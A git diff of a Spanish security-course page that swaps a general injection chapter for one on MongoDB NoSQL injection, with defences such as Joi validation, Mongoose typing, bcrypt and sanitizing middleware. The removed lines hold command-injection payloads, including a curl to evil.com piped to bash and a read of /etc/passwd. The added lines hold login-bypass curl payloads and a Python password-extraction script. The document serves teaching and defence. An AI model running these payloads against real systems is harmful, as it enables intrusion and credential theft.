@@ -1,419 +1,533 @@
 ---
 sidebar_position: 4
-title: "Injection Attacks"
+title: "Inyecciones NoSQL"
 ---
 
-## 2. Injection Attacks
+# Inyecciones NoSQL
 
-### 2.1 ¿Qué es una inyección?
+## ¿Qué es NoSQL Injection?
 
-Ocurre cuando un atacante puede insertar código malicioso en una consulta o comando que la aplicación ejecuta.
+NoSQL Injection es el equivalente moderno de la clásica SQL Injection, adaptado a bases de datos NoSQL como MongoDB, CouchDB, o Firebase. Aunque estas bases de datos no usan SQL, son igualmente vulnerables a inyecciones cuando los datos del usuario se incorporan directamente en las queries sin validación.
 
-### 2.2 SQL Injection (aunque usamos MongoDB)
+En el caso de MongoDB, las queries son objetos JavaScript. Si un atacante puede controlar la estructura de estos objetos (no solo sus valores), puede manipular completamente la lógica de la consulta.
 
-Ejemplo vulnerable en SQL:
+### ¿Por qué es diferente a SQL Injection?
 
+En SQL Injection clásico, el atacante inyecta fragmentos de sintaxis SQL:
+```sql
+-- Input del atacante: ' OR '1'='1
+SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''
+-- Retorna todos los usuarios
+```
+
+En NoSQL Injection con MongoDB, el atacante inyecta estructuras de objetos:
 ```javascript
-// ❌ VULNERABLE
-app.get('/user', (req, res) => {
-  const userId = req.query.id;
-  const query = `SELECT * FROM users WHERE id = ${userId}`;
-  db.query(query, (err, results) => {
-    res.json(results);
-  });
-});
-
-// Ataque: GET /user?id=1 OR 1=1
-// Resultado: Devuelve TODOS los usuarios
-```
-
-**Solución**: Usar prepared statements o ORMs
-
-```javascript
-// ✅ SEGURO
-app.get('/user', (req, res) => {
-  const userId = req.query.id;
-  const query = 'SELECT * FROM users WHERE id = ?';
-  db.query(query, [userId], (err, results) => {
-    res.json(results);
-  });
-});
-```
-
-### 2.3 NoSQL Injection (MongoDB)
-
-MongoDB también es vulnerable a inyecciones:
-
-```javascript
-// ❌ VULNERABLE
-app.post('/login', async (req, res) => {
-  const { username, password } = req.body;
-  
-  const user = await User.findOne({
-    username: username,
-    password: password
-  });
-  
-  if (user) {
-    res.json({ success: true });
-  } else {
-    res.status(401).json({ success: false });
-  }
-});
-
-// Ataque con:
-// { "username": "admin", "password": { "$ne": null } }
-// Esto busca usuarios donde password != null
-```
-
-**Solución**: Sanitizar entradas y usar operadores seguros
-
-```javascript
-// ✅ SEGURO
-import mongoSanitize from 'express-mongo-sanitize';
-
-app.use(mongoSanitize()); // Middleware que elimina $ y .
-
-app.post('/login', async (req, res) => {
-  const { username, password } = req.body;
-  
-  // Validar que sean strings
-  if (typeof username !== 'string' || typeof password !== 'string') {
-    return res.status(400).json({ error: 'Invalid input' });
-  }
-  
-  const user = await User.findOne({
-    username: username,
-    password: hashPassword(password) // Nunca guardes passwords en texto plano
-  });
-  
-  if (user) {
-    res.json({ success: true });
-  } else {
-    res.status(401).json({ success: false });
-  }
-});
-```
-
-### **2.4 Command Injection** 💻
-
-**Descripción**: Ejecutar comandos del sistema operativo es **extremadamente peligroso** si incluye input del usuario.
-
-**¿Por qué es crítico?**
-- Acceso completo al servidor
-- Puede ejecutar cualquier comando (rm, wget, curl, etc.)
-- Bypass completo de seguridad de la aplicación
-- Instalación de backdoors
-
-#### Código Vulnerable
-
-```javascript
-// ❌ VULNERABLE: exec con input del usuario
-const { exec } = require('child_process');
-
-app.get('/ping', (req, res) => {
-  const host = req.query.host;
-  
-  // Construye comando con string concatenation
-  exec(`ping -c 4 ${host}`, (error, stdout) => {
-    res.send(stdout);
-  });
-});
-
-// Ataque: GET /ping?host=google.com;whoami
-// Ejecuta: ping -c 4 google.com;whoami
-// Resultado: Muestra el usuario del servidor
-
-// Ataque: GET /ping?host=google.com;cat /etc/passwd
-// Resultado: Expone usuarios del sistema
-
-// Ataque: GET /ping?host=google.com;curl http://evil.com/backdoor.sh|bash
-// Resultado: Descarga y ejecuta backdoor
-```
-
-**Caracteres peligrosos en shell**:
-```
-;  # Separador de comandos
-&  # Ejecuta comando en background
-|  # Pipe (encadena comandos)
-`  # Command substitution
-$  # Variable expansion
->  # Redirección
-<  # Redirección input
-\n # Nueva línea (múltiples comandos)
-&&  # AND lógico
-||  # OR lógico
-```
-
-#### Prevención
-
-**1. Usar librerías específicas (MEJOR opción)**
-
-```javascript
-// ✅ SEGURO: Librería específica para ping
-import ping from 'ping';
-import validator from 'validator';
-
-app.get('/ping', async (req, res) => {
-  const host = req.query.host;
-  
-  // Validar que es dominio o IP válida
-  if (!validator.isFQDN(host) && !validator.isIP(host)) {
-    return res.status(400).json({ error: 'Invalid host format' });
-  }
-  
-  try {
-    const result = await ping.promise.probe(host, {
-      timeout: 10,
-      extra: ['-c', '4'], // Argumentos seguros
-    });
-    res.json({
-      host: result.host,
-      alive: result.alive,
-      time: result.time,
-    });
-  } catch (error) {
-    res.status(500).json({ error: 'Ping failed' });
-  }
-});
-```
-
-**2. Si DEBES usar exec, usar execFile con argumentos**
-
-```javascript
-import { execFile } from 'child_process';
-import validator from 'validator';
-
-app.get('/ping', (req, res) => {
-  const host = req.query.host;
-  
-  if (!validator.isFQDN(host) && !validator.isIP(host)) {
-    return res.status(400).json({ error: 'Invalid host' });
-  }
-  
-  // execFile NO ejecuta shell, pasa argumentos directamente
-  execFile('ping', ['-c', '4', host], (error, stdout, stderr) => {
-    if (error) {
-      return res.status(500).json({ error: 'Ping failed' });
-    }
-    res.send(stdout);
-  });
-});
-
-// Ataque: GET /ping?host=google.com;whoami
-// execFile NO interpreta ; como separador de comandos
-// Intenta hacer ping a "google.com;whoami" (falla, no ejecuta whoami)
-```
-
-**3. Whitelist de opciones permitidas**
-
-```javascript
-const ALLOWED_COMMANDS = {
-  'git-status': ['git', ['status']],
-  'git-branch': ['git', ['branch']],
-  'npm-version': ['npm', ['--version']],
-};
-
-app.post('/execute', (req, res) => {
-  const { command } = req.body;
-  
-  const allowedCommand = ALLOWED_COMMANDS[command];
-  
-  if (!allowedCommand) {
-    return res.status(400).json({ error: 'Command not allowed' });
-  }
-  
-  const [executable, args] = allowedCommand;
-  
-  execFile(executable, args, (error, stdout) => {
-    if (error) {
-      return res.status(500).json({ error: error.message });
-    }
-    res.json({ output: stdout });
-  });
-});
+// Input del atacante: { "$ne": null }
+db.users.find({ username: { $ne: null }, password: { $ne: null } })
+// Retorna todos los usuarios donde username y password no son null
 ```
 
 ---
 
-### **2.5 LDAP Injection**
+## Anatomía del Ataque
 
-**Descripción**: Similar a SQL injection pero en queries LDAP (Active Directory, OpenLDAP).
+### Operadores de MongoDB explotables
 
-```javascript
-// ❌ VULNERABLE
-const ldap = require('ldapjs');
+MongoDB proporciona operadores de comparación y lógicos que comienzan con `$`. Si estos operadores pueden ser inyectados por el usuario, se produce la vulnerabilidad:
 
-app.post('/ldap-search', (req, res) => {
-  const { username } = req.body;
-  
-  const filter = `(uid=${username})`;
-  // Ataque: username = "*)(uid=*" 
-  // Filter: (uid=*)(uid=*)
-  // Retorna TODOS los usuarios
-  
-  client.search('ou=users,dc=example,dc=com', { filter }, (err, search) => {
-    // ...
-  });
-});
+| Operador | Significado | Query legítima | Query inyectada |
+|----------|-------------|----------------|-----------------|
+| `$ne` | Not equal | `{ status: { $ne: 'deleted' } }` | `{ password: { $ne: '' } }` → cualquier password no vacío |
+| `$gt` | Greater than | `{ age: { $gt: 18 } }` | `{ password: { $gt: '' } }` → cualquier password |
+| `$gte` | Greater or equal | `{ price: { $gte: 100 } }` | `{ password: { $gte: '' } }` → cualquier password |
+| `$lt` | Less than | `{ stock: { $lt: 10 } }` | Menos útil para auth bypass |
+| `$in` | In array | `{ status: { $in: ['active', 'pending'] } }` | `{ password: { $in: [passwords] } }` |
+| `$regex` | Regular expression | `{ name: { $regex: 'john', $options: 'i' } }` | `{ password: { $regex: '.*' } }` → cualquier string |
+| `$exists` | Field exists | `{ avatar: { $exists: true } }` | `{ password: { $exists: true } }` |
+| `$where` | JavaScript eval | `{ $where: 'this.age > 18' }` | `{ $where: 'this.isAdmin' }` → bypass de roles |
 
-// ✅ SEGURO: Escapar caracteres especiales LDAP
-function escapeLDAP(str) {
-  return str.replace(/[\\*()\x00]/g, (char) => {
-    return '\\' + char.charCodeAt(0).toString(16);
-  });
-}
+### Código Vulnerable
 
-app.post('/ldap-search', (req, res) => {
-  const { username } = req.body;
-  
-  const safeUsername = escapeLDAP(username);
-  const filter = `(uid=${safeUsername})`;
-  
-  client.search('ou=users,dc=example,dc=com', { filter }, (err, search) => {
-    // ...
-  });
-});
-```
-
----
-
-### **2.6 Template Injection (SSTI)**
-
-**Descripción**: Inyectar código en templates (Pug, EJS, Handlebars).
-
-```javascript
-// ❌ VULNERABLE: Renderiza template con input del usuario
-const pug = require('pug');
-
-app.get('/greeting', (req, res) => {
-  const name = req.query.name;
-  
-  // Compila template con input del usuario
-  const template = pug.compile(`h1 Hello #{name}`);
-  const html = template({ name });
-  res.send(html);
-});
-
-// Ataque: /greeting?name=#{process.mainModule.require('child_process').execSync('whoami')}
-// Resultado: Ejecuta código en el servidor
-
-// ✅ SEGURO: No compilar templates dinámicamente
-const pug = require('pug');
-
-// Template predefinido, NO del usuario
-const template = pug.compileFile('./views/greeting.pug');
-
-app.get('/greeting', (req, res) => {
-  const name = req.query.name;
-  
-  // Pasar solo DATOS, no template
-  const html = template({ name }); // Pug escapa automáticamente
-  res.send(html);
-});
-```
-
----
-
-## 🧪 Testing de Injection
+Veamos un endpoint de login vulnerable típico:
 
 ```typescript
-// tests/injection.test.ts
-import request from 'supertest';
-import app from '../app';
+// ❌ CÓDIGO VULNERABLE
 
-describe('Injection Protection', () => {
-  describe('NoSQL Injection', () => {
-    it('debe rechazar objetos en login', async () => {
-      const res = await request(app)
-        .post('/api/login')
-        .send({
-          username: { $ne: null },
-          password: { $ne: null },
-        });
-      
-      expect(res.status).toBe(400); // Validación rechaza objetos
-    });
-    
-    it('debe sanitizar operadores MongoDB', async () => {
-      const res = await request(app)
-        .post('/api/search')
-        .send({ query: { $where: "1==1" } });
-      
-      expect(res.status).toBe(400);
-    });
+import { Router } from 'express';
+import { MongoClient } from 'mongodb';
+
+const router = Router();
+
+router.post('/login', async (req, res) => {
+  const { email, password } = req.body;
+  
+  // Conectar a MongoDB directamente
+  const client = new MongoClient(process.env.MONGO_URI);
+  const db = client.db('myapp');
+  
+  // VULNERABLE: email y password van directo a la query
+  // Si email = { "$ne": null }, busca email != null
+  const user = await db.collection('users').findOne({ 
+    email: email,      // ← Sin validación de tipo
+    password: password // ← Sin validación de tipo
   });
   
-  describe('Command Injection', () => {
-    const commandInjectionPayloads = [
-      'google.com;whoami',
-      'google.com|whoami',
-      'google.com&whoami',
-      'google.com`whoami`',
-      'google.com$(whoami)',
-    ];
-    
-    it('debe rechazar caracteres shell peligrosos', async () => {
-      for (const payload of commandInjectionPayloads) {
-        const res = await request(app)
-          .get('/api/ping')
-          .query({ host: payload });
-        
-        expect(res.status).toBe(400);
-        expect(res.body.error).toContain('Invalid');
-      }
-    });
-    
-    it('debe aceptar dominios válidos', async () => {
-      const res = await request(app)
-        .get('/api/ping')
-        .query({ host: 'google.com' });
-      
-      expect(res.status).toBe(200);
-    });
-  });
+  if (user) {
+    const token = generateToken(user);
+    return res.json({ token, user });
+  }
+  
+  return res.status(401).json({ error: 'Invalid credentials' });
 });
+```
+
+### Explotación paso a paso
+
+**Paso 1: Request normal**
+
+```bash
+curl -X POST http://localhost:3000/api/login \
+  -H "Content-Type: application/json" \
+  -d '{
+    "email": "usuario@example.com",
+    "password": "mipassword123"
+  }'
+```
+
+Query MongoDB resultante:
+```javascript
+db.users.findOne({ 
+  email: "usuario@example.com", 
+  password: "mipassword123" 
+})
+```
+Comportamiento normal: solo retorna usuario si credenciales coinciden.
+
+**Paso 2: Request maliciosa**
+
+```bash
+curl -X POST http://localhost:3000/api/login \
+  -H "Content-Type: application/json" \
+  -d '{
+    "email": {"$ne": null},
+    "password": {"$ne": null}
+  }'
+```
+
+Query MongoDB resultante:
+```javascript
+db.users.findOne({ 
+  email: { $ne: null },     // email != null (cualquier email)
+  password: { $ne: null }   // password != null (cualquier password)
+})
+```
+Resultado: **Retorna el primer usuario de la base de datos** sin verificar credenciales.
+
+**Paso 3: Variaciones del ataque**
+
+```bash
+# Atacar usuario específico conociendo solo el email
+curl -X POST http://localhost:3000/api/login \
+  -H "Content-Type: application/json" \
+  -d '{
+    "email": "admin@example.com",
+    "password": {"$ne": ""}
+  }'
+
+# Usar regex para encontrar admin
+curl -X POST http://localhost:3000/api/login \
+  -H "Content-Type: application/json" \
+  -d '{
+    "email": {"$regex": "admin"},
+    "password": {"$gt": ""}
+  }'
+
+# Usar $where para lógica compleja (muy peligroso)
+curl -X POST http://localhost:3000/api/login \
+  -H "Content-Type: application/json" \
+  -d '{
+    "$where": "this.role === \"admin\""
+  }'
 ```
 
 ---
 
-## 📋 Resumen: Checklist Anti-Injection
+## Escenario de ataque más sofisticado
 
-### SQL/NoSQL Injection
-- [ ] **Usar ORMs/Query Builders** (Mongoose, Sequelize, Prisma)
-- [ ] **Prepared statements** para SQL raw queries
-- [ ] **express-mongo-sanitize** middleware instalado
-- [ ] **Validar tipos** con Joi/Zod (rechazar objetos donde esperas strings)
-- [ ] **No concatenar strings** para queries
+### Extracción de datos con $regex
 
-### Command Injection
-- [ ] **Evitar exec/eval** completamente si es posible
-- [ ] **Usar librerías específicas** (ping, ssh2, etc.)
-- [ ] **Si usas exec, usar execFile** con array de argumentos
-- [ ] **Validar estrictamente** inputs (validator.js para URLs, IPs, etc.)
-- [ ] **Whitelist de comandos** permitidos
+Un atacante paciente puede extraer passwords carácter por carácter usando `$regex`:
 
-### General
-- [ ] **Principle of Least Privilege**: Usuario DB con permisos mínimos
-- [ ] **Input validation**: Validar SIEMPRE en servidor
-- [ ] **Sanitización**: express-mongo-sanitize, DOMPurify, etc.
-- [ ] **Testing**: Tests automatizados con payloads de injection
-- [ ] **WAF**: Web Application Firewall en producción (Cloudflare, AWS WAF)
+```bash
+# ¿El password del admin empieza con 'a'?
+curl -X POST http://localhost:3000/api/login \
+  -H "Content-Type: application/json" \
+  -d '{
+    "email": "admin@example.com",
+    "password": {"$regex": "^a"}
+  }'
+# Si login exitoso → el password empieza con 'a'
+# Si falla → probar otra letra
 
-:::danger Nunca Confíes en el Cliente
-La validación del cliente **NO es seguridad**. Un atacante puede:
-- Desactivar JavaScript
-- Modificar requests con DevTools/Burp Suite
-- Enviar requests directamente con curl/Postman
+# ¿El password empieza con 'ab'?
+curl -X POST http://localhost:3000/api/login \
+  -d '{"email": "admin@example.com", "password": {"$regex": "^ab"}}'
 
-**SIEMPRE valida en el servidor**.
-:::
+# ¿El password empieza con 'abc'?
+curl -X POST http://localhost:3000/api/login \
+  -d '{"email": "admin@example.com", "password": {"$regex": "^abc"}}'
 
-:::tip ORMs No Son Mágicos
-Mientras Mongoose/Sequelize previenen SQL injection en queries normales, aún debes:
-- Sanitizar inputs
-- Validar tipos
-- No usar `$where` con input del usuario
-- Evitar `eval` en agregaciones
-:::
+# Continuar hasta extraer el password completo...
 ```
+
+Este ataque es automatizable con un script:
+
+```python
+import requests
+import string
+
+url = "http://localhost:3000/api/login"
+charset = string.ascii_letters + string.digits + string.punctuation
+password = ""
+
+while True:
+    found = False
+    for char in charset:
+        test_password = password + char
+        response = requests.post(url, json={
+            "email": "admin@example.com",
+            "password": {"$regex": f"^{test_password}"}
+        })
+        
+        if response.status_code == 200:
+            password += char
+            print(f"Password parcial: {password}")
+            found = True
+            break
+    
+    if not found:
+        break
+
+print(f"Password completo: {password}")
+```
+
+---
+
+## Prevención en Taller-Testing-Security
+
+El proyecto implementa múltiples capas de defensa que trabajan juntas para prevenir NoSQL Injection:
+
+### 1. Mongoose Schema Types
+
+Mongoose actúa como un ORM que define tipos estrictos para cada campo. Cuando un valor no coincide con el tipo esperado, Mongoose intenta convertirlo:
+
+```typescript
+// api/src/components/User/model.ts
+
+import mongoose, { Document, Schema } from 'mongoose';
+
+export interface IUserModel extends Document {
+  email: string;
+  password: string;
+}
+
+const UserSchema = new Schema<IUserModel>({
+  email: {
+    type: String,      // ← Tipo definido como String
+    required: true,
+    unique: true,
+    lowercase: true,
+    trim: true,
+  },
+  password: {
+    type: String,      // ← Tipo definido como String
+    required: true,
+    select: false,
+  }
+});
+
+export default mongoose.model<IUserModel>('User', UserSchema);
+```
+
+**¿Qué pasa cuando el atacante envía un objeto?**
+
+```typescript
+// Input del atacante
+const attackPayload = {
+  email: { "$ne": null },
+  password: { "$ne": null }
+};
+
+// Mongoose internamente hace:
+// 1. Mira el schema: email tiene type: String
+// 2. Intenta convertir { "$ne": null } a String
+// 3. En JavaScript: String({ "$ne": null }) → "[object Object]"
+// 4. Query final que ejecuta MongoDB:
+db.users.findOne({ 
+  email: "[object Object]", 
+  password: "[object Object]" 
+})
+// 5. No existe ningún usuario con email "[object Object]"
+// 6. findOne retorna null → Login falla
+
+// ¡La inyección fue neutralizada por la coerción de tipos!
+```
+
+### 2. Validación con Joi
+
+Joi valida la estructura de los datos antes de que lleguen a Mongoose:
+
+```typescript
+// api/src/validation/auth.validation.ts
+
+import Joi from 'joi';
+
+export const loginSchema = Joi.object({
+  email: Joi.string()    // ← Debe ser un string
+    .email()             // ← Debe tener formato de email
+    .required(),
+    
+  password: Joi.string() // ← Debe ser un string
+    .min(6)              // ← Mínimo 6 caracteres
+    .required(),
+});
+```
+
+**Validación en acción:**
+
+```typescript
+// Input del atacante
+const attackPayload = {
+  email: { "$ne": null },
+  password: { "$ne": null }
+};
+
+// Joi valida
+const { error, value } = loginSchema.validate(attackPayload);
+
+// Error generado:
+// {
+//   "message": "Validation error",
+//   "errors": [
+//     {
+//       "field": "email",
+//       "message": "\"email\" must be a string",
+//       "type": "string.base"
+//     },
+//     {
+//       "field": "password", 
+//       "message": "\"password\" must be a string",
+//       "type": "string.base"
+//     }
+//   ]
+// }
+
+// La request es rechazada con 400 Bad Request
+// Nunca llega a MongoDB
+```
+
+### 3. Arquitectura segura de autenticación
+
+El proyecto nunca busca por password en la base de datos. En su lugar:
+
+```typescript
+// api/src/components/Auth/service.ts
+
+import bcrypt from 'bcrypt';
+import User from '../User/model';
+
+export async function authenticate(
+  email: string, 
+  password: string
+): Promise<IUserModel> {
+  // 1. Buscar SOLO por email
+  // El password NUNCA va en la query a MongoDB
+  const user = await User.findOne({ email }).select('+password');
+  
+  if (!user) {
+    throw new Error('Invalid credentials');
+  }
+  
+  // 2. Comparar password con bcrypt
+  // bcrypt.compare es timing-safe (previene timing attacks)
+  const isValidPassword = await bcrypt.compare(password, user.password);
+  
+  if (!isValidPassword) {
+    throw new Error('Invalid credentials');
+  }
+  
+  return user;
+}
+```
+
+**¿Por qué esta arquitectura es segura?**
+
+```text
+┌─────────────────────────────────────────────────────────────────────┐
+│                ARQUITECTURA SEGURA DE LOGIN                         │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                     │
+│  Request: { email: {$ne: null}, password: {$ne: null} }             │
+│                                                                     │
+│  CAPA 1: Joi Validation                                             │
+│  ├─ email debe ser string → {$ne: null} no es string               │
+│  └─ BLOQUEADO con 400 Bad Request                                   │
+│                                                                     │
+│  ─────────────────────────────────────────────────────────────────  │
+│                                                                     │
+│  Si Joi fallara (hipotéticamente):                                  │
+│                                                                     │
+│  CAPA 2: Mongoose Types                                             │
+│  ├─ email: String → {$ne: null} se convierte a "[object Object]"   │
+│  └─ Query: { email: "[object Object]" } → No encuentra usuario     │
+│                                                                     │
+│  ─────────────────────────────────────────────────────────────────  │
+│                                                                     │
+│  Si Mongoose fallara (hipotéticamente):                             │
+│                                                                     │
+│  CAPA 3: Arquitectura de Servicio                                   │
+│  ├─ Query solo por email: findOne({ email })                        │
+│  ├─ Password NUNCA está en la query MongoDB                         │
+│  ├─ Comparación con bcrypt.compare() fuera de la base de datos      │
+│  └─ No hay forma de bypassear bcrypt con operadores MongoDB         │
+│                                                                     │
+└─────────────────────────────────────────────────────────────────────┘
+```
+
+### 4. Sanitización de operadores MongoDB
+
+Como defensa adicional, puedes crear un middleware que rechace cualquier campo que contenga operadores `$`:
+
+```typescript
+// api/src/middleware/mongoSanitize.ts
+
+import { Request, Response, NextFunction } from 'express';
+
+/**
+ * Middleware que rechaza requests con operadores MongoDB
+ * Previene NoSQL Injection incluso si otras capas fallan
+ */
+export function mongoSanitize(
+  req: Request, 
+  res: Response, 
+  next: NextFunction
+): void {
+  const hasDollarSign = (obj: any): boolean => {
+    if (typeof obj !== 'object' || obj === null) {
+      return false;
+    }
+    
+    for (const key of Object.keys(obj)) {
+      // Detectar claves que empiezan con $
+      if (key.startsWith('$')) {
+        return true;
+      }
+      // Recursivamente buscar en objetos anidados
+      if (typeof obj[key] === 'object' && hasDollarSign(obj[key])) {
+        return true;
+      }
+    }
+    
+    return false;
+  };
+  
+  if (hasDollarSign(req.body)) {
+    return res.status(400).json({
+      error: 'Invalid request: MongoDB operators not allowed'
+    });
+  }
+  
+  if (hasDollarSign(req.query)) {
+    return res.status(400).json({
+      error: 'Invalid request: MongoDB operators not allowed'
+    });
+  }
+  
+  next();
+}
+
+// Uso en Express
+import express from 'express';
+import { mongoSanitize } from './middleware/mongoSanitize';
+
+const app = express();
+app.use(express.json());
+app.use(mongoSanitize);  // ← Aplicar a todas las rutas
+```
+
+También puedes usar la librería `express-mongo-sanitize`:
+
+```bash
+npm install express-mongo-sanitize
+```
+
+```typescript
+import mongoSanitize from 'express-mongo-sanitize';
+
+app.use(mongoSanitize({
+  replaceWith: '_',  // Reemplaza $ con _
+  onSanitize: ({ key, req }) => {
+    console.warn(`Blocked MongoDB operator in field: ${key}`);
+  }
+}));
+```
+
+---
+
+## Demostración práctica
+
+### Test de seguridad contra NoSQL Injection
+
+```bash
+# 1. Intento con operador $ne
+curl -X POST http://localhost:4000/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email": {"$ne": null}, "password": {"$ne": null}}'
+
+# Respuesta esperada: 400 Bad Request
+# { "message": "Validation error", "errors": [...] }
+
+# 2. Intento con operador $gt  
+curl -X POST http://localhost:4000/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email": "admin@test.com", "password": {"$gt": ""}}'
+
+# Respuesta esperada: 400 Bad Request
+
+# 3. Intento con $regex
+curl -X POST http://localhost:4000/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email": {"$regex": "admin"}, "password": {"$regex": ".*"}}'
+
+# Respuesta esperada: 400 Bad Request
+
+# 4. Login legítimo (para comparar)
+curl -X POST http://localhost:4000/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email": "test@test.com", "password": "password123"}'
+
+# Respuesta esperada: 200 OK con token (si las credenciales son válidas)
+```
+
+---
+
+## Checklist de Prevención NoSQL Injection
+
+```text
+□ Usar un ODM como Mongoose con schemas tipados
+□ Validar tipos de datos con Joi/Zod antes de procesar
+□ Nunca usar contraseñas en queries a la base de datos
+□ Comparar passwords con bcrypt.compare() fuera de MongoDB
+□ Sanitizar inputs para rechazar operadores $ 
+□ Usar express-mongo-sanitize o middleware equivalente
+□ Deshabilitar $where y mapReduce si no son necesarios
+□ Configurar roles de MongoDB con mínimos privilegios
+□ Auditar queries en logs para detectar patrones sospechosos
+□ Usar parameterized queries cuando trabajes con drivers directos
+```
+
+---
+
+## Próximo Paso
+
+Ahora que entiendes las inyecciones, veamos la vulnerabilidad #1 del OWASP Top 10: el control de acceso deficiente. Continúa con **[Broken Access Control](./access-control)**.
